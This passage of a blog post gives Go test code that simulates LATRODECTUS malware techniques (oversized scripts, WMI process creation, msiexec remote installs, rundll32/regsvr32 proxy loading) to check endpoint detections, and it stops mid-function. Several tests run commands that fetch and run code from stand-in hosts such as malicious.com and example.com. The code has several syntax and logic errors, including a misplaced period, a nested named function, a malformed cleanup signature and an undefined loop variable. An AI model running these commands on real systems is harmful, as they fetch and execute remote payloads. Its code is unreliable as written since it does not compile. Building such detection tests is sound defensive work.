<p>each major tactic + technique used by malware like <code>LATRODECTUS</code> is well-documented enough to correspond to a MITRE ATT&amp;CK rule. i wrote some more tests in <code>Go</code> (like the ones in the previous post) to extend the detection capabilities.</p>
<h3 id="oversized-windows-script-execution">oversized windows script execution</h3>
<p><code>LATRODECTUS</code> is known to be delivered via oversized JavaScript files, usually larger than 800KB, to bypass malware sandbox file upload size limits. the below script simulates creation + execution of large scripts in various formats [<code>js</code>, <code>vbs</code>, <code>hta</code>, etc.].</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>    fileTypes <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;js&#34;</span>, <span style="color:#f1fa8c">&#34;jse&#34;</span>, <span style="color:#f1fa8c">&#34;vbs&#34;</span>, <span style="color:#f1fa8c">&#34;vbe&#34;</span>, <span style="color:#f1fa8c">&#34;wsh&#34;</span>, <span style="color:#f1fa8c">&#34;hta&#34;</span>}
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> _, fileType <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> fileTypes {
</span></span><span style="display:flex;"><span>        scriptPath <span style="color:#ff79c6">:=</span> fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;C:\\Temp\\script.%s&#34;</span>, fileType)
</span></span><span style="display:flex;"><span>        scriptContent <span style="color:#ff79c6">:=</span> strings.<span style="color:#50fa7b">Repeat</span>(<span style="color:#f1fa8c">&#34;A&#34;</span>, <span style="color:#bd93f9">30000001</span>) <span style="color:#6272a4">// 30MB + 1
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>        file, err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Create</span>(scriptPath)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to create script file (%s): %v&#34;</span>. fileType, err))
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">defer</span> file.<span style="color:#50fa7b">Close</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        _, err = file.<span style="color:#50fa7b">WriteString</span>(scriptContent)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to write to script file (%s): %v&#34;</span>, fileType, err))
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// execute script using `cscript.exe`, `wscript.exe`, `mshta.exe`
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;cscript.exe %s&#34;</span>, scriptPath))
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;wscript.exe %s&#34;</span>, scriptPath))
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;mshta.exe %s&#34;</span>, scriptPath))
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// execute command function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">executeCommand</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;command execution not available&#34;</span>)
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        }
</span></span><span style="display:flex;"><span>        out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        }
</span></span><span style="display:flex;"><span>        Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;successfully executed command %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;process execution blocked&#34;</span>)
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> cleanup {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// remove files
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	fileTypes <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;js&#34;</span>, <span style="color:#f1fa8c">&#34;jse&#34;</span>, <span style="color:#f1fa8c">&#34;vbs&#34;</span>, <span style="color:#f1fa8c">&#34;vbe&#34;</span>, <span style="color:#f1fa8c">&#34;wsh&#34;</span>, <span style="color:#f1fa8c">&#34;hta&#34;</span>}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, fileType <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> fileType {
</span></span><span style="display:flex;"><span>		scriptPath <span style="color:#ff79c6">:=</span> fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;C:\\Temp\\script.%s&#34;</span>, fileType)
</span></span><span style="display:flex;"><span>		err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Remove</span>(scriptPath)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to remove script file %s: %v&#34;</span>, fileType, err))
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;cleanup completed!&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects the presence of unusually large script files being created + executed.</p>
<h3 id="execution-via-suspicious-wmi-client">execution via suspicious WMI client</h3>
<p><code>LATRODECTUS</code> uses WMI to execute processes in a suspicious manner, using parent processes like <code>mshta.exe</code>, <code>excel.exe</code>, and others.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>    effectiveParents <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;excel.exe&#34;</span>, <span style="color:#f1fa8c">&#34;powerpnt.exe&#34;</span>, <span style="color:#f1fa8c">&#34;winword.exe&#34;</span>, <span style="color:#f1fa8c">&#34;mshta.exe&#34;</span>, <span style="color:#f1fa8c">&#34;wscript.exe&#34;</span>, <span style="color:#f1fa8c">&#34;wmic.exe&#34;</span>, <span style="color:#f1fa8c">&#34;rundll32.exe&#34;</span>, <span style="color:#f1fa8c">&#34;regsvr.exe&#34;</span>, <span style="color:#f1fa8c">&#34;msbuild.exe&#34;</span>, <span style="color:#f1fa8c">&#34;InstallUtil.exe&#34;</span>}
</span></span><span style="display:flex;"><span>    parentPaths <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;C:\\Users\\Public\\*&#34;</span>, <span style="color:#f1fa8c">&#34;C:\\ProgramData\\*&#34;</span>, <span style="color:#f1fa8c">&#34;C:\\Users\\*\\AppData\\*&#34;</span>, <span style="color:#f1fa8c">&#34;C:\\Windows\\Microsoft.NET\\*&#34;</span>}
</span></span><span style="display:flex;"><span>    hashExclusions <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;0e692d9d3342fdcab1ce3d61aed0520989a94371e5898edb266c92f1fe11c97f&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;8ee339af3ce1287066881147557dc3b57d1835cbba56b2457663068ed25b7840&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;f27cb78f44fc8f70606be883bbed705bd1dd2c2f8a84a596e5f4924e19068f22&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    executableExclusions <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\WerFault.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Windows\\SysWOW64\\WerFault.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\typeperf.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\AcroTray.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Program Files\\Mozilla Firefox\\firefox.exe&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// process starting via WMI with unusual parent
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">for</span> _, parent <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> effectiveParents {
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe Start-Process -FilePath &#39;C:\\Windows\\System32\\Wbem\\WimPrvSE.exe&#39; -ArgumentList &#39;wmic process call create C:\\Windows\\System32\\cmd.exe&#39; -Wait&#34;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe Start-Process -FilePath &#39;C:\\Windows\\System32\\cmd.exe&#39; -ArgumentList &#39;/C whoami&#39;&#34;</span>))
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> _, path <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> parentPaths {
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe Start-Process -FilePath &#39;C:\\Windows\\System32\\Wbem\\WimPrvSE.exe&#39; -ArgumentList &#39;wmic process call create %s\\cmd.exe&#39; -Wait&#34;</span>, path))
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe Start-Process -FilePath &#39;%s\\cmd.exe&#39; -ArgumentList &#39;/C whoami&#39;&#34;</span>, path))
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects unusual WMI-based process executions when triggered by non-standard parent processes.</p>
<h3 id="remote-file-execution-via-msiexec">remote file execution via <code>MSIEXEC</code></h3>
<p><code>LATRODECTUS</code> abuses <code>msiexec.exe</code> to execute files hosted n remote WebDAV shares.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi /q&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe -i http://example.com/test.msi -q&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /PaCKagE http://example.com/test.msi /qn&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi /qn&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe -i http://example.com/test.msi /quiet&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe -fv http://example.com/test.msi /quiet&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi /quiet&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi /qn /quiet&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;devinit.exe msi-install http://example.com/test.msi&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi /quiet INSTALLDIR=%LOCALAPPDATA%&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi transforms=http://example.com/transform.mst /q&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;command execution not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects the use of <code>msiexec.exe</code> with remote URLs, which is uncommon. it simulates the downloading + execution of potentially malicious files.</p>
<h3 id="rundll32-or-regsvr32-loaded-a-dll-from-unbacked-memory"><code>rundll32</code> or <code>regsvr32</code> loaded a DLL from unbacked memory</h3>
<p><code>LATRODECTUS</code> loads DLLs from unbacked memory regions, using <code>rundll32.exe</code> or <code>regsvr32.exe</code>. these are commonly abused in DLL side-loading attacks.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe shell32.dll,Control_RunDLL&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;regsvr32.exe /s /u shell32.dll&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe shell32.dll,ShellExec_RunDLL&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe javascript:\&#34;\\..\\mshtml,RunHTMLApplication \&#34;;document.write();Close();&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;regsvr32.exe /s /u javascript:\&#34;\\..\\mshtml,RunHTMLApplication \&#34;;document.write();Close();&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// simulate DLL loading from unbacked memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dllLoadingCommands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe shell32.dll,ShellExec_RunDLL http://malicious.com/malicious.dll&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;regsvr32.exe /s /u http://malicious.com/malicious.dll&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> dllLoadingCommands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNprotected
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects this advanced evasion technique, where the malware tries to execute code from regions in memory that are not tied to any known executable image.</p>
<h3 id="network-module-loaded-from-suspicious-unbacked-memory">network module loaded from suspicious unbacked memory</h3>
<p>the malware&rsquo;s network modules are sometimes loaded from memory regions that aren&rsquo;t backed by any known executable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
